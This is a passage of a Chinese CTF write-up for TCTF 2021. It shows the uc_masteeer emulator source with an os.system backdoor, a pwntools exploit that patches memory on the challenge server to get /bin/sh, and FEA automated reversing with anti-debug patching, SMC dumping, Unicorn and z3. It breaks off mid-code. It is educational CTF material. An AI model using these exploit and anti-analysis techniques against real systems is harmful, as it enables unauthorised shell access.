\x20\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span><br>TAIL = <span class="hljs-string">b&#x27;\x31\xc0\xb9\x32\x00\x00\x00\x48\x8d\x15\x55\x00\x00\x00\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x18\x66\x89\x44\x24\x0e\x31\xc0\xe8\x6d\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x0e\xb9\x02\x00\x00\x00\xe8\x58\x00\x00\x00\x80\x7c\x24\x0e\x79\x75\x11\x48\x83\xc4\x18\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x10\x31\xf6\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x32\x00\x00\x00\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x21\x20\x54\x65\x73\x74\x20\x73\x75\x63\x63\x65\x65\x64\x21\x0a\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x3f\x20\x28\x79\x2f\x5b\x6e\x5d\x29\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span><br>ADMIN = <span class="hljs-string">b&#x27;\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\xf4&#x27;</span>)<br>admin_offset = CODE + <span class="hljs-number">0x6b</span> - <span class="hljs-number">5</span><br>writable = []<br>is_admin = <span class="hljs-literal">False</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_hook</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> is_admin<br>    is_admin = <span class="hljs-literal">True</span><br>    uc.mem_write(CODE + <span class="hljs-number">0x1000</span>, ADMIN)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_mem_access</span>(<span class="hljs-params">uc, access, address, size, value, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> is_admin<br>    <span class="hljs-keyword">if</span> is_admin <span class="hljs-keyword">and</span> address == <span class="hljs-number">0xbabecafe233</span>:<br>        is_admin = <span class="hljs-literal">False</span><br>        cmd = uc.mem_read(value, <span class="hljs-number">0x100</span>)<br>        <span class="hljs-keyword">if</span> cmd.startswith(<span class="hljs-string">b&#x27;k33nlab&#x27;</span>):<br>            os.system(cmd[<span class="hljs-number">7</span>:cmd.index(<span class="hljs-number">0</span>)].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_safe_mem_write</span>(<span class="hljs-params">self, address, data</span>):</span><br>    end = address + <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> writable:<br>        <span class="hljs-keyword">if</span> address &gt;= page <span class="hljs-keyword">and</span> end &lt;= page + <span class="hljs-number">0x1000</span>:<br>            self.mem_write(address, data)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> UcError(UC_ERR_WRITE_PROT)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p64</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, n)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init</span>(<span class="hljs-params">uc</span>):</span><br>    <span class="hljs-keyword">global</span> writable<br><br>    uc.safe_mem_write = types.MethodType(_safe_mem_write, uc)<br><br>    uc.mem_map(CODE, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_EXEC)<br>    uc.mem_write(CODE, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x1000</span>)<br>    uc.mem_map(CODE + <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x1000</span>, UC_PROT_ALL)<br>    uc.mem_write(CODE + <span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x1000</span>)<br>    uc.mem_map(CODE + <span class="hljs-number">0x2000</span>, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_EXEC)<br>    uc.mem_write(CODE + <span class="hljs-number">0x2000</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">0x1000</span>)<br>    uc.mem_write(CODE, MAIN)<br>    uc.mem_write(CODE + <span class="hljs-number">0x2000</span>, TAIL)<br><br>    uc.mem_map(STACK, <span class="hljs-number">0x1000</span>, UC_PROT_READ | UC_PROT_WRITE)<br>    uc.reg_write(UC_X86_REG_RSP, STACK + <span class="hljs-number">0xf00</span>)<br>    uc.mem_write(STACK, p64(CODE + <span class="hljs-number">0x1000</span>) + p64(CODE + <span class="hljs-number">0x2000</span>) + p64(CODE))<br><br>    writable = (CODE + <span class="hljs-number">0x1000</span>, STACK)<br><br>    uc.hook_add(UC_HOOK_INSN, hook_syscall, <span class="hljs-literal">None</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, UC_X86_INS_SYSCALL)<br>    uc.hook_add(UC_HOOK_CODE, admin_hook, <span class="hljs-literal">None</span>, admin_offset, admin_offset + <span class="hljs-number">1</span>)<br>    uc.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">play</span>():</span><br>    uc = Uc(UC_ARCH_X86, UC_MODE_64)<br>    init(uc)<br><br>    data = os.read(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">0xd</span>)<br>    data += <span class="hljs-string">b&#x27;\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08&#x27;</span><br>    uc.mem_write(CODE + <span class="hljs-number">0x1000</span>, data)<br><br>    <span class="hljs-keyword">try</span>:<br>        uc.emu_start(CODE, CODE + <span class="hljs-number">0x3000</span> - <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;error...&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    play()<br><br><br></code></pre></td></tr></table></figure>



<p>题目菜单</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">Welcome to uc_masteeer<br><span class="hljs-number">1.</span> admin test<br><span class="hljs-number">2.</span> user test<br><span class="hljs-number">3.</span> patch data<br>?:<br></code></pre></td></tr></table></figure>
<p>sys_call<br>rdi =&gt; 调用号<br>rsi =&gt; 参数1<br>rdx =&gt; 参数2<br>rcx =&gt; 参数3</p>
<p>系统调用表<br>0: read(fd, buf_addr, size)<br>1: write(fd, buf_addr, size)<br>60: exit(code)</p>
<p>admin: jmp [0xBABECAFE008] -&gt; tail<br>main:  jmp [0xBABECAFE000] -&gt; admin<br>tail:  jmp [0xBABECAFE010] -&gt; main</p>
<p>main 中触发 admin 代码加载并设置 is_admin = true, 然后 jmp [0xBABECAFE000] 跳转到 admin 代码执行，admin 代码中有后门字符串，修改字符串 echo 位置为 /bin/sh.</p>
<p>main 触发 admin 加载后，admin 会立即执行，没有机会修改 admin 代码。</p>
<p>利用思路: 修改 [0xBABECAFE000] 内存为 main 地址，防止执行 admin, 进一步修改 admin 内存中的字符串为 /bin/sh ， 最后[0xBABECAFE000]修改回admin的地址，通过 user test 执行 admin.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>CODE = <span class="hljs-number">0xdeadbeef000</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process([&#x27;python3&#x27;, &#x27;sb2.py&#x27;])</span><br>p=remote(<span class="hljs-string">&#x27;111.186.59.29&#x27;</span>, <span class="hljs-number">10087</span>)<br>p.sendline(<span class="hljs-string">&quot;&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(<span class="hljs-number">0xBABECAFE000</span>))<br>p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(<span class="hljs-number">0x8</span>))<br>p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, p64(<span class="hljs-number">0xdeadbeef000</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(<span class="hljs-number">0xDEADBEF005A</span>))<br>p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(<span class="hljs-number">0x8</span>))<br>p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(<span class="hljs-number">0xBABECAFE000</span>))<br>p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(<span class="hljs-number">0x8</span>))<br>p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, p64(<span class="hljs-number">0xdeadbef0000</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="FEA"><a href="#FEA" class="headerlink" title="FEA"></a>FEA</h2><p>给出一个连上端口后下载的文件： <a href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/FEA" title="FEA">FEA</a></p>
<p>要求选手自动化逆向<br>连上端口，通过 proof 验证后，服务端发回一个 ELF 文件，需要在 10s 内提交该 ELF 解出来的 flag，一共要解3次。</p>
<p>简单分析服务器发回的 ELF 文件, 用 ollvm 混淆过，有两次反调试调用.<br>反调试函数地址: 0x400EC0 直接 patch </p>
<p>SMC 解密</p>
<img src="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/16254610407351.jpg" srcset="/img/loading.gif" lazyload class="" width="16254610407351">

<p>调用SMC解密出来的代码</p>
<img src="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/16254611212081.jpg" srcset="/img/loading.gif" lazyload class="" width="16254611212081">

<p>解密出来的代码逻辑：<br>从标准输入读取 8 字节数据做加密变换，再调用一个非常大的函数生成比较数据，最后比较加密后的数据是否与 8 字节的比较数据一致。</p>
<p>加密变换过程如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuckyou</span>(<span class="hljs-params">a1, a2, a3, a4</span>):</span><br>    v2 = <span class="hljs-number">7</span> * a2<br>    print(<span class="hljs-string">&quot;v2 = &quot;</span>, <span class="hljs-built_in">hex</span>(v2))<br>    <span class="hljs-keyword">if</span> v2:<br>        v3 = (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span>:<br>        v3 = <span class="hljs-number">0xfffffffa</span><br><br>    print(<span class="hljs-string">&quot;v3 = &quot;</span>, <span class="hljs-built_in">hex</span>(v3))<br><br>    v4 = a1 + <span class="hljs-number">6</span><br>    print(<span class="hljs-string">&quot;v4 = &quot;</span>, <span class="hljs-built_in">hex</span>(v4))<br><br>    v5 = a4 + <span class="hljs-number">5</span><br>    print(<span class="hljs-string">&quot;v5 = &quot;</span>, <span class="hljs-built_in">hex</span>(v5))<br>    v6 = a3 * <span class="hljs-number">4</span><br>    print(<span class="hljs-string">&quot;v6 = &quot;</span>, <span class="hljs-built_in">hex</span>(v6))<br><br>    <span class="hljs-keyword">if</span> v6:<br>        v1 = (v6 &amp; <span class="hljs-number">0xffff</span>) - (v6 &gt;&gt; <span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">else</span>:<br>        v1 = <span class="hljs-number">0xFFFFFFFD</span><br><br>    print(<span class="hljs-string">&quot;v1 = &quot;</span>, <span class="hljs-built_in">hex</span>(v1))<br><br><br>    v7 = ((v3 ^ v5) &amp; <span class="hljs-number">0xffff</span>) * <span class="hljs-number">3</span><br><br>    print(<span class="hljs-string">&quot;v7 = &quot;</span>, <span class="hljs-built_in">hex</span>(v7))<br><br>    hight_v7 = v7 &gt;&gt; <span class="hljs-number">16</span><br>    low_v7 = v7 &amp; <span class="hljs-number">0xffff</span><br>    tmp = low_v7 - hight_v7<br>    v8 = tmp<br>    print(<span class="hljs-string">&quot;v8 = &quot;</span>, <span class="hljs-built_in">hex</span>(v8))<br><br>    v9_t = (v8 + (v1 ^ v4))<br><br>    v9 = v9_t &amp; <span class="hljs-number">0xffff</span><br><br>    print(<span class="hljs-string">&quot;v9 = &quot;</span>, <span class="hljs-built_in">hex</span>(v9))<br>    v9_2 = v9 * <span class="hljs-number">2</span><br><br><br>    print(<span class="hljs-string">&quot;v9 * 2 = &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-number">2</span> * v9))<br><br>    v10 = (v9_2 &amp; <span class="hljs-number">0xffff</span>) - (v9_2 &gt;&gt; <span class="hljs-number">16</span>)<br>    print(<span class="hljs-string">&quot;v10 = &quot;</span>, <span class="hljs-built_in">hex</span>(v10))<br><br><br>    r1 = (((v3 ^ v10) &lt;&lt; <span class="hljs-number">16</span> ) | (v10 ^ v5)) &amp; <span class="hljs-number">0xffffffff</span><br>    r2 = (((v4 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 ^ (v10 + v8) ) &amp; <span class="hljs-number">0xffff</span>)<br><br>    print(<span class="hljs-string">&quot;r1 = &quot;</span>, <span class="hljs-built_in">hex</span>(r1))<br>    print(<span class="hljs-string">&quot;r2 = &quot;</span>, <span class="hljs-built_in">hex</span>(r2))<br><br>    <span class="hljs-keyword">return</span> r1, r2<br></code></pre></td></tr></table></figure>
<p>用 z3 写出逆函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuckyouZ3</span>(<span class="hljs-params">targetR1, targetR2</span>):</span><br>    a1 = BitVec(<span class="hljs-string">&quot;a1&quot;</span>, <span class="hljs-number">32</span>)<br>    a2 = BitVec(<span class="hljs-string">&quot;a2&quot;</span>, <span class="hljs-number">32</span>)<br>    a3 = BitVec(<span class="hljs-string">&quot;a3&quot;</span>, <span class="hljs-number">32</span>)<br>    a4 = BitVec(<span class="hljs-string">&quot;a4&quot;</span>, <span class="hljs-number">32</span>)<br><br>    v2 = <span class="hljs-number">7</span> * a2<br><br>    v3 = If(v2 != <span class="hljs-number">0</span>, (v2 &amp; <span class="hljs-number">0xffff</span>) - (v2 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xfffffffa</span>)<br>    v4 = a1 + <span class="hljs-number">6</span><br>    v5 = a4 + <span class="hljs-number">5</span><br>    v6 = a3 * <span class="hljs-number">4</span><br><br>    v1 = If(v6 != <span class="hljs-number">0</span>, (v6 &amp; <span class="hljs-number">0xffff</span>) - (v6 &gt;&gt; <span class="hljs-number">16</span>), <span class="hljs-number">0xFFFFFFFD</span>)<br>    v7 = ((v3 ^ v5) &amp; <span class="hljs-number">0xffff</span>) * <span class="hljs-number">3</span><br><br>    hight_v7 = v7 &gt;&gt; <span class="hljs-number">16</span><br>    low_v7 = v7 &amp; <span class="hljs-number">0xffff</span><br>    tmp = low_v7 - hight_v7<br>    v8 = tmp<br>    v9_t = (v8 + (v1 ^ v4))<br>    v9 = v9_t &amp; <span class="hljs-number">0xffff</span><br>    v9_2 = v9 * <span class="hljs-number">2</span><br><br>    v10 = (v9_2 &amp; <span class="hljs-number">0xffff</span>) - (v9_2 &gt;&gt; <span class="hljs-number">16</span>)<br><br>    r1 = (((v3 ^ v10) &lt;&lt; <span class="hljs-number">16</span>) | (v10 ^ v5)) &amp; <span class="hljs-number">0xffffffff</span><br>    r2 = (((v4 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 ^ (v10 + v8)) &amp; <span class="hljs-number">0xffff</span>)<br><br>    s = Solver()<br>    s.add(a1 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a2 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a3 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(a4 &lt; <span class="hljs-number">0x10000</span>)<br>    s.add(<span class="hljs-number">0</span> &lt;= a1)<br>    s.add(<span class="hljs-number">0</span> &lt;= a2)<br>    s.add(<span class="hljs-number">0</span> &lt;= a3)<br>    s.add(<span class="hljs-number">0</span> &lt;= a4)<br>    s.add(r1 == targetR1)<br>    s.add(r2 == targetR2)<br>    <span class="hljs-keyword">assert</span> s.check() == sat<br>    res = s.model()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join([de(res[a1].as_long()), de(res[a2].as_long()), de(res[a3].as_long()), de(res[a4].as_long())])<br></code></pre></td></tr></table></figure>
<p>提取出生成的比较数据，调用 fuckyouZ3 就可以得到输入.</p>
<p>这道要求自动化逆向，服务器发回的 ELF 文件，比较数据计算函数代码都不一样。<br>为了得到比较数据，我们需要自动化：</p>
<ol>
<li>自动化解密 SMC</li>
<li>自动化调用比较数据计算函数</li>
</ol>
<p>自然想到用 unicorn 模拟执行。经过尝试，unicorn 解密 SMC 很慢，调用比较数据计算函数的速度可以接受。</p>
<p>尝试自动化 patch ELF 文件实现自动化SMC解密。<br>patch点：在 SMC 解密完成后调用 write 输出解密后的数据。</p>
<img src="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/16254620550325.jpg" srcset="/img/loading.gif" lazyload class="" width="16254620550325">

<p>运行 patch 之后的程序，从标准输出可以得到解密后的 SMC 代码数据。</p>
<p>得到 SMC 代码数据后，直接用 unicorn 调用 SMC 代码中生成比较数据的函数，即可得到比较数据。<br>生成比较数据的函数中存在一些 int3 指令，主程序提前设置了处理 int3 的 handler，handler 中对关键数据进行变换，unicorn 中需要处理这种情况。</p>
<p>完整 exp 实现如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_code</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">pass</span><br>        <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_int3</span>(<span class="hljs-params">uc, intro, user_data</span>):</span><br>    rip = uc.reg_read(UC_X86_REG_RIP)<br>    deadVal = u32(uc.mem_read(<span class="hljs-number">0xDEAD0000</span>, <span class="hljs-number">4</span>))<br>    deadVal ^= <span class="hljs-number">0xDEADBEEF</span><br>    uc.mem_write(<span class="hljs-number">0xDEAD0000</span>, p32(deadVal))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuck</span>(<span class="hljs-params">code</span>):</span> <span class="hljs-comment"># 调用 unicorn 从 smc code 中提取比较数据</span><br>    CODE = <span class="hljs-number">0x0</span><br>    CODE_SIZE = <span class="hljs-number">0x100000</span><br><br>    DATA = <span class="hljs-number">0x700000</span><br>    DATA_SIZE = <span class="hljs-number">0x20000</span><br><br>    STACK = <span class="hljs-number">0x7F00000000</span><br>    STACK_SIZE = <span class="hljs-number">0x10000</span><br><br>    DEAD = <span class="hljs-number">0xDEAD0000</span><br>    DEAD_SIZE = <span class="hljs-number">0x1000</span><br><br>    uc = Uc(UC_ARCH_X86, UC_MODE_64)<br>    uc.mem_map(CODE, CODE_SIZE, UC_PROT_ALL)<br>    uc.mem_map(DEAD, DEAD_SIZE, UC_PROT_ALL)<br>    uc.mem_map(STACK, STACK_SIZE, UC_PROT_ALL)<br>    uc.mem_map(DATA, DATA_SIZE, UC_PROT_ALL)<br><br>    uc.mem_write(CODE, code)<br>    uc.reg_write(UC_X86_REG_RSP, STACK + STACK_SIZE - <span class="hljs-number">0x10</span>)<br><br>    uc.hook_add(UC_HOOK_CODE, hook_code)<br>    uc.hook_add(UC_HOOK_INTR, hook_int3)<br>    uc.reg_write(UC_X86_REG_RDI, DATA)<br><br>    uc.mem_write(STACK + STACK_SIZE - <span class="hljs-number">0x10</span>, p64(<span class="hljs-number">0x1447380</span>))<br><br>    <span class="hljs-keyword">try</span>:<br>        uc.emu_start(<span class="hljs-number">0</span>, <span class="hljs-number">0x1447380</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        data = uc.mem_read(DATA, <span class="hljs-number">0x8</span>)<br>        <span class="hljs-keyword">return</span> u32(data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]), u32(data[<span class="hljs-number">4</span>:])<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">de</span>(<span class="hljs-params">x</span>):</span><br>    x = <span class="hljs-built_in">hex</span>(x)[<span class="hljs-number">2</span>:]<br>    rr = x[<span class="hljs-number">2</span>:] + x[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>    print(rr)<br>    <span class="hljs-keyword">return</span> rr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuckyouZ3</span>(<span class="hljs-params">targetR1, targetR2</span>):</span> <span class="hljs-comment"># 